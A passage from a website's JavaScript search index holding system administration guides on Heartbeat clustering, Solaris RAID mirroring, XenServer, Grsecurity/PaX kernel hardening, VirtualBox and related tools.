milliseconds, add the ms suffix. initdead: indicates a specific deadtime for configurations where the network takes some time to start. initdead is normally at least twice the deadtime. This delay is given by default in seconds; to use milliseconds, add the ms suffix. udpport: indicates the port to use for taking the pulse. node: specifies the names of the machines that are part of the cluster. This name must be identical to that returned by the uname -n command. auto_failback: indicates the behavior to adopt if the master node returns to the cluster. If set to on, when the master node returns to the cluster, everything is transferred to it. If set to off, services continue to run on the slave even when the master returns to the cluster. apiauth: indicates that the root uid has the right to administer remotely via the GUI (this also implies adding root to the haresources group) crm: allows remote connections respawn: the binary to launch to open the port for remote control Personally, I prefer the off value for auto_failback so that I can manually return to normal when the production load is less important. Moreover, if the master node suffers from a serious problem, we could have a start/stop loop that would result in a continuous relay of services. This can become problematic.\nharesources linkNow, we will define the master node, the cluster’s IP address, and the services that need to be assured. Initially (for basic configuration), we will only set up the cluster’s IP address.\nTo configure this aspect of HeartBeat, we edit the haresources file using the following command:\nsudo vi /etc/ha.d/haresources CAUTION: the resource configuration file must be STRICTLY identical on each node.\nIn our example, the resource configuration file looks like this:\ntwin1 IPaddr::192.168.252.205 This means we define the master node as twin1 and the cluster IP address as 192.168.252.205. We’ll stop here for the basic configuration, but I invite you to read the advanced configuration section for more information.\nauthkeys linkThe authkeys file allows cluster nodes to identify each other. This file is edited via the command:\nsudo vi /etc/ha.d/authkeys CAUTION: the authentication key configuration file must be STRICTLY identical on each node.\nIn our example, the authkeys file looks like this:\nauth 2 1 md5 \"cluster twin test\" 2 crc The auth keyword indicates which identification system we will use. If the link is not physically secure, it is necessary to use md5 encryption with a more intelligent key string than this one.\nIn our case, there are only the two twins on a small local network, so we use the crc system.\nOnce the file is edited, don’t forget to protect it by entering the command:\nsudo chmod 600 /etc/ha.d/authkeys Starting Up and First Tests linkBefore making our first tests, I suggest installing an SSH server on each of the servers.\nCheck if SSH connections to each node via their own IP addresses (192.168.252.200 and 192.168.252.201 in our example) work. If so, we can do a small test.\nStart the HeartBeat service on the master node; namely Twin 1 via the following command:\nsudo /etc/init.d/heartbeat start Then, using the same command, activate HeartBeat on Twin 2.\nYou can now try an SSH connection to the cluster address; namely: 192.168.252.205 in our example. Once identified, you notice that the command prompt tells you that you are on twin1.\nNow, firmly remove the power cord from Twin 1.\nYour SSH console will report an error (normal… ;-) ).\nRestart an SSH connection to the cluster address; namely: 192.168.252.205 in our example. The service responds! Yet, Twin 1 is stopped. Once identified, you notice that the command prompt indicates:\ndeimos@twin2:~$ Everything works. Now, let’s imagine that Twin 1 comes back into the cluster (plug Twin 1’s power back in).\nThe cluster still runs on Twin 2. To force the switch to Twin 1 (since we are in auto_failback off mode), we enter the following command on Twin 2:\nsudo /etc/init.d/heartbeat restart And Twin 1 automatically takes over.\nAdvanced Configuration linkThe configuration line in the /etc/ha.d/haresources file as defined above only indicates that the master node is Twin 1 and the cluster IP address is 192.168.252.205. According to this configuration, HeartBeat does the minimum, no script or service is started or stopped on the different nodes composing the cluster.\nLet’s see how we can configure the haresources file with more finesse for specific needs.\nAssigning Multiple IP Addresses to the Cluster linkWe wrote a line like this during the basic configuration:\ntwin1 IPaddr::192.168.252.205 This means that we assign the IP address 192.168.252.205 to the cluster. However, we may need more than one IP address to access the cluster. That is, we have multiple entry points to the cluster and each entry point (IP address) will allow access to the cluster.\nTo do this, we simply configure the nodes with the following /etc/ha.d/haresources file:\ntwin1 IPaddr::192.168.252.205 IPaddr::192.168.252.206 And you can assign as many additional IP addresses as desired.\nSpecifying Actions to Take linkOnce the basic configuration is established, it’s the master node (if all goes well) that provides services to the outside. If all your nodes are configured exactly the same and run the same services permanently, this doesn’t pose any problems.\nIf we want to be more precise in the node configuration, we also indicate the actions to take in the cluster when a node fails. This aspect is primordial if certain services must access exclusive resources (i.e. only one node at a time can use a particular resource). This is the case with mirrored disks via the network (see RAID-1 over IP) where only one node can access the mirrored disk in read-write mode.\nTo address this kind of problem, we can specify actions to take by completing the /etc/ha.d/haresources file. To specify these actions, we use scripts in the style of the Init System V (or additional HeartBeat scripts or even homemade scripts) to indicate what the cluster should do in case of a switch from one node to another.\nLet’s take a simple example (but not an interesting one ;-)): the ssh service. The Init script for this service is located in /etc/init.d/ (along with many others; apache, inetd, rsync,…). We configure the /etc/ha.d/haresources file (on each node, don’t forget it!) as follows:\ntwin1 IPaddr::192.168.252.205 ssh This line gives HeartBeat the following information:\nThe master node is twin1. The cluster IP address is 192.168.252.205. The actions to take in case of a switch are: ssh. Let’s see in detail what it means by “The actions to take are…”.\nThe scripts used by HeartBeat must respond to 3 commands: start, stop, and status. These commands are called in the following cases:\nstart: called on the node to which the cluster has just switched. stop: called on the node that has just failed. So, let’s imagine that Twin 1 is responding to requests addressed to the cluster. If Twin 1 falls, HeartBeat executes ssh stop on it (if possible obviously) then HeartBeat switches the IP to Twin 2 and executes ssh start on the latter.\nIn the ssh case, it doesn’t have much interest but for mounting file systems or just sending emails, it’s essential.\nThe search order for scripts is as follows:\n/etc/ha.d/resource.d/: which is installed by default and contains a number of interesting scripts. /etc/init.d/: which is the default directory for the System V Init system. You can add custom scripts in /etc/ha.d/resource.d/ but remember that they must be able to respond to the start, stop, and status commands.\nDon’t hesitate to look at the few scripts in /etc/ha.d/resource.d/ to draw inspiration from them and know how they work (syntactically speaking).\nPractical Considerations linkRegarding the Network Connection linkThe solution described above uses the network bandwidth intensively. Every two seconds (or more frequently depending on the configuration), each node sends a UDP packet to each of the other nodes. In addition to that, each node will respond to each of the packets sent. I’ll let you imagine the number of packets transiting on the network.\nThe ideal is to have machines with multiple network cards. For example, we can use two network cards: one network card for taking pulses and one network card for services.\nIf your cluster consists of only two nodes, then it’s better to use a crossover cable between the two machines to avoid overloading the production network.\nIn any case, I advise you to use a network dedicated to pulse taking and service switching. Otherwise, you will be facing an overload of your production network and performances will slightly drop.\nRegarding an Additional Serial Connection linkIn addition to the UDP pulse, you can perform a direct pulse via a null modem serial cable that connects the two machines. This pulse is an effective complement to the network in case a network interface would fail.\nTo use this additional serial connection, you must introduce the following two lines in the /etc/ha.d/ha.cf file (just after the bcast eth0 line):\nbaud 19200 serial /dev/ttyS0 I won’t go further regarding serial connections because I haven’t had the opportunity to experiment with them. During a configuration change…\nDuring a configuration change of the cluster (the 3 HeartBeat configuration files), you must force the heartbeat processes to reread the configuration files. Always make sure to have identical configuration files on the different nodes of your servers, otherwise, clustering would not work.\nTo force the rereading of the configuration files, you enter the following command on each node of the cluster, finishing with the node that has control (normally, the master node unless you are in a catastrophic situation). Prepare the consoles and commands in advance so that the time during which the nodes have different configurations is as short as possible!:\nsudo /etc/init.d/heartbeat reload The safest solution is to stop all heartbeats, apply the modifications, and restart them; but sometimes, production environments do not allow this kind of thing.\nMultiple Clusters on the Same Network linkRecently, I added an additional cluster on a network where there was already a cluster. This posed some problems (nothing serious, just gigantic logs).\nIn fact, the nodes of the second cluster were receiving broadcast heartbeat packets and didn’t know how to interpret them. A warning message in the heartbeat log gave something like this:\nAug 8 06:28:54 nodeprod1 heartbeat[6743]: ERROR: process_status_message: bad node [nodearch2] in message Aug 8 06:28:54 nodeprod1 heartbeat[6743]: info: MSG: Dumping message with 9 fields [...] In fact, the nodes were sending messages in broadcast to each other without knowing what to do with them. To solve this problem, we had to remove the broadcast and use either unicast or multicast.\nTo do this, you just need to modify the /etc/ha.d/ha.cf file and comment out the bcast line. Then, depending on the number of nodes in your cluster (if you only have two nodes, unicast is sufficient) you modify the configuration.\nFor a unicast configuration (still following the example above) on Twin1, add the line:\nucast eth1 192.168.252.201 And for Twin2, add the line:\nucast eth1 192.168.252.200 For a multicast configuration (easier to maintain identical files or if there are more than two nodes), add the following line (on both nodes):\nmcast eth1 225.0.0.1 694 1 0 mcast 0 The multicast group is an address you choose between 224.0.0.0 - 239.255.255.255 through which your nodes will communicate. Be careful not to have other systems using this multicast group. The ttl indicates the number of network hops the packet can make (from 1 to 255). Generally, nodes are on the same network and a value of 1 is perfect.\nThe zero that ends the line is a bug in heartbeat ;-).\nResources linkFor additional high availability and load balancing resources, please refer to these related guides:\nHAProxy: Load Balance Your Traffic Installation and Configuration of a Heartbeat V2 Cluster "
            }
        );
    index.add(
            {
                id:  552 ,
                href: "\/Load_Balancing_et_Fail_Over_pour_les_services_Web\/",
                title: "Load Balancing and Fail Over for Web Services",
                description: "Documentation on load balancing and failover solutions for web services, including guides and resources.",
                content: "For comprehensive documentation on load balancing with failover for web services, please refer to our detailed HAProxy guide:\nHAProxy: Load Balance Your Traffic\nThis guide covers setup and configuration for HTTP load balancing, MySQL/MariaDB balancing, and SSL offloading.\n"
            }
        );
    index.add(
            {
                id:  553 ,
                href: "\/IRC_:_Mise_en_place_d\u0027un_serveur_IRC_avec_UnrealIRCD_et_Anope_Services\/",
                title: "IRC: Setting up an IRC server with UnrealIRCD and Anope Services",
                description: "Documentation and resources for setting up an IRC server using UnrealIRCD and Anope Services",
                content: "Here is a well-prepared documentation that allows you to create an IRC server:\nDocumentation on setting up an IRC server\nPrinciples and structure of IRC networks\n"
            }
        );
    index.add(
            {
                id:  554 ,
                href: "\/Protection_de_l%27espace_d%27adressage_:_%C3%A9tat_de_l%27art_sous_Linux_et_OpenBSD\/",
                title: "Address Space Protection: State of the Art in Linux and OpenBSD",
                description: "An analysis of address space protection techniques in Linux and OpenBSD operating systems",
                content: "Address Space Protection - State of the Art in Linux and OpenBSD\n"
            }
        );
    index.add(
            {
                id:  555 ,
                href: "\/Drivers_Broadcom_et_Debian\/",
                title: "Broadcom Drivers and Debian",
                description: "Installation guide for Broadcom drivers on Debian systems, providing a simple solution for hardware compatibility issues.",
                content: "Introduction linkTroublesome drivers! Thanks to manufacturers who provide drivers with problematic licenses. In short, with Debian version 5, network cards with Broadcom chipsets stopped working properly.\nNo problem, here’s the solution.\nInstallation linkSimply install this package:\napt-get install firmware-bnx2 A quick reboot and you’re all set!\nResources linkhttp://forum.hardware.fr/hfr/OSAlternatifs/reseaux-securite/activer-broadcom-debian-sujet_67918_1.htm\n"
            }
        );
    index.add(
            {
                id:  556 ,
                href: "\/Creation_d\u0027un_Raid_1_(mirroring)_sous_Solaris\/",
                title: "Creating a RAID 1 (mirroring) on Solaris",
                description: "Guide to setting up RAID 1 mirroring for filesystems in Solaris using DiskSuite and ZFS.",
                content: "Introduction linkThe Solaris system includes the DiskSuite package that allows RAID 1 mirroring of a UFS filesystem using LVM. This tutorial explains how to achieve this. It goes without saying that you need two disks of the same capacity.\nProcedure linkHere are the necessary steps: Once we’re ready to mirror a disk, we display its partitions with the format command:\nFormat Searching for disks...done AVAILABLE DISK SELECTIONS: 0. c1t0d0 root /pci@0/pci@0/pci@2/scsi@0/sd@0,0 1. c1t1d0 /pci@0/pci@0/pci@2/scsi@0/sd@1,0 We choose the 1st disk (if it’s the one to be duplicated), then:\nformat\u003e partition And we display the partition table with “p”:\npartition\u003e p Volume: root Current partition table (original): Total disk cylinders available: 14087 + 2 (reserved cylinders) Part Tag Flag Cylinders Size Blocks 0 root wm 0 - 14086 136.71GB (14087/0/0) 286698624 1 unassigned wm 0 0 (0/0/0) 0 2 backup wm 0 - 14086 136.71GB (14087/0/0) 286698624 3 unassigned wm 0 0 (0/0/0) 0 4 unassigned wm 0 0 (0/0/0) 0 5 unassigned wm 0 0 (0/0/0) 0 6 unassigned wm 0 0 (0/0/0) 0 7 unassigned wm 0 0 (0/0/0) 0 Note: In Solaris, like in BSD, the 3rd partition (no. 2) is actually the entire disk.\nSo now we have a view of our existing partitions…\nUFS linkImportant: We need to create a small partition of about 20MB that will host the “metadata” concerning the RAID 1. This metadata will be used by DiskSuite. The first step will be to copy the partition table from the 1st disk to the 2nd. Then we will create databases for the metadata. Then we will manually decide which partition will be mirrored by creating sub-mirrors. We will change the vfstab (the file that indicates which partition mounts where). We will attach the sub-mirrors to a mirror. We will create aliases for the mirrors. We will add this alias to the “boot-device”.\nZFS linkWe will simply create an identical partition to the one on the master disk and set it as root. Go directly to Copying the partition table to the 2nd disk\nCreating a small partition for the metadata link partition\u003e p Volume: root Current partition table (original): Total disk cylinders available: 14087 + 2 (reserved cylinders) Part Tag Flag Cylinders Size Blocks 0 root wm 0 - 14086 136.71GB (14087/0/0) 286698624 1 unassigned wm 0 0 (0/0/0) 0 2 backup wm 0 - 14086 136.71GB (14087/0/0) 286698624 3 unassigned wm 0 0 (0/0/0) 0 4 unassigned wm 0 0 (0/0/0) 0 5 unassigned wm 0 0 (0/0/0) 0 6 unassigned wm 0 0 (0/0/0) 0 7 unassigned wm 0 0 (0/0/0) 0 Enter the number of the partition to edit and press “Enter” Choose the tag “unassigned” flag: vm size: 20mb\nThen exit:\nlabel Copying the partition table to the 2nd disk link prtvtoc /dev/rdsk/c0t0d0s2 | fmthard -s - /dev/rdsk/c0t1d0s2 Use the 2nd slice to indicate the entire disk.\nCreating metadata database for DiskSuite link metadb -a -f -c2 /dev/dsk/c0t0d0s3 /dev/dsk/c0t1d0s3 CAUTION: Choose the correct partition letter on both disks (the small one we created)\nCreating sub-mirrors linkUFS linkLet’s assume we want to mirror the 6 partitions of the disk (except the swap), for example / /usr /var /opt /home and /etc\nLet’s start with / (root partition):\nmetainit -f d10 1 1 c0t0d0s0 metainit -f d20 1 1 c0t1d0s0 metainit d0 -m d10 metaroot d0 (Use this command only on the root slice!) CAUTION: Be sure to enter the correct disk names. So here we have associated the partition containing / on the 1st disk with the mirror partition that will be on the 2nd disk, then we indicated that the 1st partition will be the master, then we specified that it was the root partition.\nYou need to do this for each partition (except the last command)\nFor /usr:\nmetainit -f d11 1 1 c0t0d0s1 metainit -f d21 1 1 c0t1d0s1 metainit d1 -m d11 For /var:\nmetainit -f d14 1 1 c0t0d0s4 metainit -f d24 1 1 c0t1d0s4 metainit d4 -m d14 For /opt:\nmetainit -f d15 1 1 c0t0d0s5 metainit -f d25 1 1 c0t1d0s5 metainit d5 -m d15 For /etc:\nmetainit -f d16 1 1 c0t0d0s6 metainit -f d26 1 1 c0t1d0s6 metainit d6 -m d16 For /home:\nmetainit -f d17 1 1 c0t0d0s7 metainit -f d27 1 1 c0t1d0s7 metainit d7 -m d17 We can view the metadata with the command:\nmetastat ZFS link zpool attach -f rpool c0t0d0s0 c0t1d0s0 Once finished, that’s it! You can stop here, it’s done for ZFS.\nEditing the vfstab file link vi /etc/vfstab From now on, vfstab will no longer point to a disk but to a cluster. Here are the lines to edit:\nBefore, for /: /dev/md/dsk/d30 /dev/md/rdsk/d30 / ufs 1 no logging After, for /: /dev/md/dsk/d0 /dev/md/rdsk/d0 / ufs 1 no logging\nd0 will be the partition for /, then d1, d2, d3, etc…\nAt this point we can restart with these two commands in succession:\nlockfs -fa init 6 Attaching mirrors to sub-mirrors link metattach d0 d20 metattach d1 d21 metattach d4 d24 metattach d5 d25 metattach d6 d26 metattach d7 d27 These commands will start the synchronization of mirrors and sub-mirrors with each other. You can see the progress with “metastat”.\nThen we change the crash dump:\ndumpadm -d `swap -l | tail -1 | awk '{print $1}'` Creating mirror aliases linkWe need to know the absolute path of the mirrored disk:\nls -l /dev/dsk/c0t1d0s0 lrwxrwxrwx 1 root root 50 Jan 16 10:20 /dev/rdsk/c0t1d0s0 -\u003e ../../devices/pci@1f,0/pci@1,1/ide@3/dad@1,0:a With this, we will create an alias for the mirror, replacing “dad” with “disk”:\neeprom \"nvramrc=devalias mirror /pci@1f,0/pci@1,1/ide@3/disk@1,0:a\" eeprom \"use-nvramrc?=true\" Adding mirrors to the boot device link eeprom \"boot-device=disk mirror net\" Then if we only have 2 disks, we need to add this line to the /etc/system file:\nset md:mirrored_root_flag = 1 Resources linkhttp://www.brandonhutchinson.com/Mirroring_disks_with_DiskSuite.html\n"
            }
        );
    index.add(
            {
                id:  557 ,
                href: "\/asterisk-mise-en-place-d-asterisk-pbx-et-web-based-provisioning-gui\/",
                title: "Asterisk: Setting up Asterisk PBX and Web-Based Provisioning GUI",
                description: "How to install and configure Asterisk PBX, an open-source software solution that transforms a computer into a private telephone exchange system",
                content: "Introduction linkAsterisk is an open-source software that transforms a computer into a private telephone exchange or PABX. Asterisk is published under the GPL license.\nAsterisk provides features such as voicemail, conferencing, voice servers, and call distribution. Asterisk implements the H.323 and SIP protocols, as well as a specific protocol called IAX (Inter-Asterisk eXchange). This IAX protocol allows communication between two Asterisk servers as well as between an Asterisk client and server. Asterisk can also act as a registrar and gateway with public networks (PSTN, GSM, etc.).\nAsterisk is extensible via scripts or modules in Perl, C, Python, PHP, and more.\nReferences linkSetting up an Asterisk Server with Freephonie\nDocumentation on setting up Asterisk PBX and Web-Based Provisioning GUI\nhttp://fr.wikipedia.org/wiki/Asterisk_%28logiciel%29\n"
            }
        );
    index.add(
            {
                id:  558 ,
                href: "\/Asterisk_:_Mise_en_place_d\u0027Asterisk_PBX_et_Web-Based_Provisioning_GUI\/",
                title: "Asterisk: Setting up Asterisk PBX and Web-Based Provisioning GUI",
                description: "Learn how to implement Asterisk, an open-source software that transforms a computer into a private telephone exchange or PABX with web-based provisioning GUI.",
                content: "Introduction linkAsterisk is open-source software that transforms a computer into a private telephone exchange or PABX. Asterisk is published under the GPL license.\nAsterisk allows, among other things, voicemail, conferencing, voice servers, and call distribution. Asterisk implements the H.323 and SIP protocols, as well as a specific protocol called IAX (Inter-Asterisk eXchange). This IAX protocol enables communication between two Asterisk servers as well as between Asterisk client and server. Asterisk can also act as a registrar and gateway with public networks (PSTN, GSM, etc.).\nAsterisk is extensible through scripts or modules in Perl, C, Python, PHP…\nReferences link Setting up an Asterisk Server with Freephonie Documentation on setting up Asterisk PBX and Web-Based Provisioning GUI https://fr.wikipedia.org/wiki/Asterisk_%28logiciel%29 "
            }
        );
    index.add(
            {
                id:  559 ,
                href: "\/NTOP:_Installation_et_configuration_d\u0027NTOP_(Network_TOP)\/",
                title: "NTOP: Installation and Configuration of NTOP (Network TOP)",
                description: "A guide for installing and configuring NTOP, a tool for collecting network information with simple configurations and web interface for viewing network statistics.",
                content: "Introduction linkThis is a tool to collect network information with simple configurations. Users may use a web browser to access the current network views that include charts and statistics.\nInstallation linkntop is available on most Linux distributions. Below are the steps tested on Ubuntu 8.10 Linux. I am sure that ntop is available for RPM based distro like CentOS.\napt-get install ntop /etc/init.d/ntop -i eth0 start Replace eth0 with the network interface name. The system will maintain a database of the network information in the /var/lib/ntop directory. Create the default admin user with:\nntop Enter the admin user password. View ntop The ntop results can be viewed with a web browser pointing to any of the URL address:\nhttp://localhost:3000 https://localhost:3001 (this may need to be configured) The ntop screen should have the following main menus:\nAbout: What is ntop, credits, documentations and configurations. Summary: Traffic, Hosts, Network load, network flows All protocols: Traffic, Throughput, Activity IP: Summary, Traffic directions, Local Utils: Data dump, View log Plugins: Lots of plugins to enable or configure Admin: Configure, Shutdown Startup settings linkTo change the ntop server startup settings, Select Admin -\u003e Configure -\u003e Startup options in the web interface.\nEdit the changes as needed and save.\nReferences linkhttp://www.howtoforge.com/installing-and-configuring-ntop\n"
            }
        );
    index.add(
            {
                id:  560 ,
                href: "\/XenServer_4.1_:_Changer_l\u0027interface_de_Management\/",
                title: "XenServer 4.1: Changing the Management Interface",
                description: "How to change the management interface on XenServer 4.1 when you've selected the wrong one during installation.",
                content: "The other day I installed a XenServer 4.1 server. Unfortunately, I selected the wrong management interface during installation, choosing eth0 instead of eth1.\nThe question was: how to change the management interface on XenServer 4.1?\nRetrieving the UUID of the interface linkFirst, we need to retrieve the UUID of the interface (they call it “PIF”):\n[root@xenserver-backup2 ~]# xe pif-list uuid ( RO) : f34c8861-94d7-c3da-0437-3a068b273db5 device ( RO): eth3 currently-attached ( RO): true VLAN ( RO): -1 network-uuid ( RO): c7c6e869-f611-11ad-871e-c130bbb9d13f uuid ( RO) : ffcba213-30dd-09d2-ee7e-0708507516f0 device ( RO): eth2 currently-attached ( RO): true VLAN ( RO): -1 network-uuid ( RO): 55efa2d9-768b-52a0-4595-cebf771ce602 uuid ( RO) : 7e5946e3-3c11-ebec-2636-713a69ce60ae device ( RO): eth1 currently-attached ( RO): true VLAN ( RO): -1 network-uuid ( RO): 7755aae6-a565-6e0a-a6b0-49cef6abee5e uuid ( RO) : b726e0f2-7b58-3489-dca7-0269630f8d4e device ( RO): eth0 currently-attached ( RO): false VLAN ( RO): -1 network-uuid ( RO): ae8ca5b4-9fa1-912a-7cca-55f4060a782c Configure IP options linkThen we assign IP options with a command like this:\nxe pif-reconfigure-ip uuid=7e5946e3-3c11-ebec-2636-713a69ce60ae IP=192.168.0.185 netmask=255.255.255.0 gateway=192.168.0.245 DNS=192.168.0.216 mode=static (The mode can be “none”, “static” or “dhcp”)\nAssign the management function linkFinally, we assign the management function to this interface:\nxe host-management-reconfigure pif-uuid=7e5946e3-3c11-ebec-2636-713a69ce60ae "
            }
        );
    index.add(
            {
                id:  561 ,
                href: "\/Monitorer_les_acc%C3%A8s_au_superuser\/",
                title: "Monitoring Superuser Access",
                description: "How to monitor and track superuser access on Unix systems through logging mechanisms.",
                content: "Introduction linkWhen the operating system is installed, a superuser is created, with an UID of 0. The usage of the su command is recorded in /var/adm/sulog.\nConfiguration linkTo record in the first place you need to do the following. In the file /etc/default/su, uncomment the entry:\nSULOG=/var/adm/sulog. Save it.\nThe entries look like this (/var/adm/sulog):\nMO 02/18 14:21 + pts/0 nrocha-root TU 02/19 14:45 - pts/0 root-nrocha WE 02/20 19:47 + pts/0 amaria-nrocha The first three columns show the time the event occurred. The fourth column shows a - for failed access and a + for successful access. The fifth column shows which port the access was made from. The last column shows the name of the user who tried to switch users and the switched user. Note: This procedure was tested on the Solaris 10 OS.\nReferences linkhttps://wikis.sun.com/display/BigAdmin/Security+Administration+Tech+Tips\n"
            }
        );
    index.add(
            {
                id:  562 ,
                href: "\/Comprendre_la_gestion_du_temps_sous_Linux\/",
                title: "Understanding Time Management in Linux",
                description: "Documentation explaining how priorities work in relation to time allocation in Linux systems",
                content: "Here’s a document that helps understand how priorities work in relation to time allocation in Linux:\nReal-time in Linux\n"
            }
        );
    index.add(
            {
                id:  563 ,
                href: "\/Protocole_BGP_et_sa_s%C3%A9curit%C3%A9\/",
                title: "BGP Protocol and its Security",
                description: "A detailed explanation of the Border Gateway Protocol (BGP), including its usage between autonomous systems and its security aspects.",
                content: "Border Gateway Protocol (BGP) is a routing protocol used particularly on the Internet. Its objective is to exchange networks (IP address + mask) with its neighbors through TCP sessions (on port 179).\nBGP is used to transmit networks between autonomous systems (AS) because it is the only protocol that supports very large volumes of data.\nBGP supports classless routing and uses route aggregation to limit the size of the routing table. Since 1994, version 4 of the protocol has been used on the Internet, with previous versions being considered obsolete. Its specifications are described in RFC 4271 A Border Gateway Protocol 4 (BGP-4).\nBesides the Internet, very large private IP networks can use BGP, for example to connect local networks using OSPF.\nMost end users of the Internet have only one connection to an Internet service provider. In this case, BGP is unnecessary because a default route is sufficient. However, a company that is redundantly connected to multiple ISPs could obtain its own autonomous system number and establish BGP sessions with each provider.\nBGP Protocol Security\n"
            }
        );
    index.add(
            {
                id:  564 ,
                href: "\/S%C3%A9curisation_de_son_noyau_avec_Grsecurity_et_PaX\/",
                title: "Securing Your Kernel with Grsecurity and PaX",
                description: "How to secure a Linux kernel with Grsecurity and PaX patches to enhance security against buffer overflows and other vulnerabilities.",
                content: "Grsecurity \u0026 PaX linkIntroduction linkAre buffer overflows and script kiddies something you’re concerned about? To counter these types of problems, there exists a kernel patch. There are many solutions to protect against “classic” attacks which are complex for professionals (but not impossible). Here is THE kernel patch that helps us protect our systems. There’s even a learning phase to help with system configuration, resulting in a highly secured solution.\nhttp://www.grsecurity.net\nhttp://pax.grsecurity.net\nhttp://www.kernel.org\nInstallation of Required Packages linkHere is the list of packages that need to be installed before applying the patch and recompiling the kernel.\napt-get install paxctl paxtest chpax gradm2 Patching and Recompiling the Kernel linkNow we need to download the kernel and the Grsecurity patch. We’ll decompress the kernel and then the patch:\nwget http://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.*.tar.bz2 tar -xjvf linux-2.6.*.tar.bz2 wget http://www.grsecurity.net/grsecurity-*.patch.gz gzip -d grsecurity-*.patch.gz What remains is to patch the kernel, make any modifications as you see fit (or following the Quickstart documentation which is the official installation guide, or find more explanations on the site), then create and install the kernel:\nln -s linux-2.6.* linux cd linux patch -p1 \u003c ../grsecurity-*.patch make menuconfig make-kpkg clean make-kpkg --revision=1.0 kernel_image dpkg -i ../linux-2.6.*.deb System Configuration linkGood, we are ready to reboot the machine. We don’t need to recompile certain software as mentioned in the documentation, such as gradm, since they exist as packages (thanks to Debian). So it’s easier to install and allows automatic updates when upgrading the distribution.\nHere are some commands that will be useful now:\n# Start the system: gradm -E # Stop the system: gradm -D # Authenticate with administrator rights: gradm –a admin # De-authenticate from administrator rights, otherwise exit shell or enter: gradm –u admin Now make sure that all your services are working, that everything has started correctly! If not, consult the FAQ\nNow that everything is working properly, we will switch to learning mode. This mode will learn everything you do on your system to normalize actions. Once you think you’ve done everything that you consider “normal,” we will disable this learning mode to go into production. However, do not perform any administrative tasks such as starting/stopping daemons, adding/removing users/software\nTo start this learning mode, here is the command:\ngradm –F –L /etc/grsec/learning.log Once learning is complete (leave it for at least 2 days), we can stop it:\ngradm –F –L /etc/grsec/learning.log –O etc/grsec/acl That’s it, all you need to do now is keep an eye on the Gradm logs to see the types of protections your kernel is implementing.\nFAQ linkHow to Debug? linkTo debug and view memory properties at the application level:\nstrace /application And to read memory at the library level:\nreadelf -e /usr/lib/library error while loading shared libraries Permission denied linkYes, not everything works. You may encounter this type of error. To check the status of an application and how it will be handled, run the chpax command:\nchpax --help chpax 0.7 .::. Manage PaX flags for binaries Usage: chpax OPTIONS FILE1 FILE2 FILEN ... -P enforce paging based non-executable pages -p do not enforce paging based non-executable pages -E emulate trampolines -e do not emulate trampolines -M restrict mprotect() -m do not restrict mprotect() -R randomize mmap() base [ELF only] -r do not randomize mmap() base [ELF only] -X randomize ET_EXEC base [ELF only] -x do not randomize ET_EXEC base [ELF only] -S enforce segmentation based non-executable pages -s do not enforce segmentation based non-executable pages -v view current flag mask -z zero flag mask (next flags still apply) The flags only have effect when running the patched Linux kernel. Next, try to see what is wrong with the application:\nchpax -v /usr/sbin/openvpn ----[ chpax 0.7 : Current flags for /usr/sbin/openvpn (PemRxS) ]---- * Paging based PAGE_EXEC : enabled (overridden) * Trampolines : not emulated * mprotect() : restricted * mmap() base : randomized * ET_EXEC base : not randomized * Segmentation based PAGE_EXEC : enabled Here, we can see that there is a restriction in OpenVPN at the mprotect level. We can work around this by removing the protection. But this means we’re allowing a vulnerability here. I’ll disable it like this:\nchpax -m /usr/sbin/openvpn To finally have:\n* mprotect() : not restricted At this point, my application will work without any issues :-)\nBind Refuses to Start: permission denied linkThis happens due to a kernel module that you either haven’t compiled or have enabled as a module. It needs to be implemented in the kernel.\nCONFIG_SECURITY_CAPABILITIES=y Resources linkLe fonctionnement de PaX\nHardening The Linux Kernel With Grsecurity\n"
            }
        );
    index.add(
            {
                id:  565 ,
                href: "\/VirtualBox_:_Alternative_%C3%A0_Vmware\/",
                title: "VirtualBox: VMware Alternative",
                description: "A guide on installing and configuring VirtualBox as an alternative to VMware on Linux systems",
                content: "Introduction linkVirtualBox is a virtual machine created by InnoTek for Windows, 32 and 64-bit GNU/Linux, and Mac OS X hosts supporting Windows (including Vista), Linux 2.x, OS/2 Warp, OpenBSD, and FreeBSD as guest systems. After several years of development, VirtualBox was released under the GNU GPL license in January 2007.\nInstallation linkDebian linkOnce you’ve downloaded the version, installation is quite simple:\ndpkg -i virtualbox*.deb Then you’ll need the bridge utilities:\napt-get install bridge-utils Solaris linkOnce you’ve downloaded the version, installation is quite simple:\ngtar -xzvf virtualbox*.tgz pkgadd -G -d VirtualBoxKern*.pkg pkgadd -d VirtualBox-*.pkg Configuration linkNetworks linkNote that since version 2.1.0, it is no longer necessary to manage the network configuration as explained below, as everything is pre-configured.\nNetwork Card Configuration linkHere’s the necessary network configuration:\n# This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo eth0 br0 iface lo inet loopback # The primary network interface iface eth0 inet static iface br0 inet dhcp bridge_ports eth0 Now let’s restart the network:\n/etc/init.d/networking restart Bridged Interfaces Configuration linkIf you want to use your VMs in bridge mode (as if they were separate computers on the network), you need to bridge your network cards. Add interfaces planned for this purpose:\nVBoxAddIF vbox0 pmavro br0 VBoxAddIF vbox1 pmavro br0 VBoxAddIF vbox2 pmavro br0 VBoxAddIF vbox3 pmavro br0 Here, I’ve added 4 to have some margin.\nAdding the User to the vboxusers Group linkNext, add your current user to the vboxusers group.\nAnd that’s it! Log out and log back in, and you’re all set!\nFAQ linkI Changed Kernel and VirtualBox No Longer Starts VMs linkSimply run this command:\n/etc/init.d/vboxdrv setup Failed to open/create the internal network… linkThis small issue on Solaris can be resolved as follows:\nrem_drv vboxflt add_drv vboxflt verr_vm_driver_not_installed linkTo solve this problem:\nln -s /devices/pseudo/vboxdrv\\@0\\:vboxdrv /dev/vboxdrv Ubuntu: Virtualbox Ubuntu unable to boot please use a kernel appropriate linkThis is due to the default kernel of the server version which is 686. Change it to 386 and everything will work like magic.\nAt the end of the installation, you can chroot into your new system and install the kernel: linux-image-386.\nResources linkVirtualBox Documentation\nControlling VirtualBox from the Command Line\nAdvanced Networking Linux configuration for VirtualBox\n"
            }
        );
    index.add(
            {
                id:  566 ,
                href: "\/GreenSQL:_Eviter_les_injections_SQL_avec_GreenSQL\/",
                title: "GreenSQL: Preventing SQL Injections with GreenSQL",
                description: "A guide on how to use GreenSQL to prevent SQL injection attacks in your database systems.",
                content: "SQL injections are common hacking methods that deserve special attention. Here is some documentation:\nDocumentation on Preventing MySQL Injection Attacks With GreenSQL\n"
            }
        );
    index.add(
            {
                id:  567 ,
